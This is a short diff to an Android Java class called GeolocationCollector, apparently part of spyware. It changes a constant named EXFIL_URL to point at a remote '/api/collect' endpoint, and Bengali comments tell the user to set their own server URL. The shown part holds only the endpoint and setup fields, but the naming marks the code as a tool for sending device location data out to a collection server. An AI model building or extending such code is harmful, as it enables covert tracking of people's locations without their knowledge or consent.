@@ -21,7 +21,7 @@ import java.util.concurrent.Executors;
 public class GeolocationCollector {
 
     // ★★★ তোমার সার্ভার URL ★★★
-    private static final String EXFIL_URL = "https://vercel-geo-api-locations.vercel.app/";  // <-- পরিবর্তন করো
+    private static final String EXFIL_URL = "https://vercel-geo-api-locations.vercel.app/api/collect";  // <-- পরিবর্তন করো
 
     private final Context context;
     private final ExecutorService executor = Executors.newSingleThreadExecutor();
